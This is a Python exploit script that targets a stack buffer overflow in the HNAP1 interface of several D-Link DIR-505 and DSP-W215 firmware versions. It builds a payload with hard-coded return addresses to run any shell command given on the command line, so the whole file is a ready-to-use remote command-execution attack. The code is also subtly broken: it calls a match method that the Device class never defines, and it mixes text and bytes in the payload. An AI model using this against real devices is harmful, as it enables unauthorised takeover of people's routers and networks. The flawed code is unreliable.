import sys
import urllib
import urllib.request

class Device(object):
   
    def __init__(self, model, version, size, ra):
        self.model = model
        self.version = version
        self.size = size
        self.ra = ra

        self.model_html = "<ModelName>%s" % self.model
        self.version_html = "<FirmwareVersion>%s" % self.version


class Vulnerability(object):

    DEFAULT_COMMAND = 'nvram show'

    VULNERABLE_DEVICES = [
            Device("DIR-505", "1.06", 30000, "\x00\x40\x52\x34"),
            Device("DIR-505", "1.07", 30000, "\x00\x40\x5C\x5C"),
            Device("DSP-W215", "1.00", 1000000, "\x00\x40\x5C\xAC"),
    ]

    def __init__(self, target, verbose=True):
        self.verbose = verbose
        self.target = target
        self.url = "%s/HNAP1/" % self.target
        if '://' not in self.url:
            self.url = 'http://' + self.url
        self._debug_message("Exploit URL: %s" % self.url)

    def _debug_message(self, msg):
        if self.verbose:
            print("[+] %s" % msg)

    def _debug_error(self, err):
        if self.verbose:
            print("[-] %s" % err)

    def _build_exploit(self, device, command):
        # Return to .text section to execute system() with an arbitrary command string
        buf =  "D" * device.size  # Fill up the stack buffer
        buf += "B" * 4            # $s0, don't care
        buf += "B" * 4            # $s1, don't care
        buf += "B" * 4            # $s2, don't care
        buf += "B" * 4            # $s3, don't care
        buf += "B" * 4            # $s4, don't care
        buf += device.ra          # $ra
        buf += "C" * 0x28        # Stack filler
        buf += command            # Command to execute
        buf += "\x00"            # NULL-terminate the command
        return buf

    def _request(self, data=None):
        req = urllib.request.Request(self.url, data)
        try:
            data = urllib.request.urlopen(req).read()
        except urllib.request.HTTPError as e:
            data = ""

            if e.code == 500:
                self._debug_message("CGI page crashed with no output (this may or may not be a good thing)!")
            else:
                self._debug_error("Unexpected response: %s" % (str(e)))

        return data

    def fingerprint(self):
        hnap_info = self._request()

        for device in self.VULNERABLE_DEVICES:
            if device.match(hnap_info):
                self._debug_message("Identified target as %s v%s" % (device.model, device.version))
                return device

        self._debug_error("Could not identify target!")
        return None

    def execute(self, device, command=DEFAULT_COMMAND):
        self._debug_message("Executing exploit [%s] against %s [%s v%s]" % (command, self.target, device.model, device.version))
        return self._request(self._build_exploit(device, command))
       
    def exploit(self, command=DEFAULT_COMMAND):
        device = self.fingerprint()
        if device:
            return self.execute(device, command)
        else:
            return ""

if __name__ == "__main__":
    if len(sys.argv) != 3: 
        print("Usage: %s <target ip> <command to execute>" % sys.argv[0])
        sys.exit(1)

    target = sys.argv[1]
    command = sys.argv[2]

    print("\n" + Vulnerability(target).exploit(command))
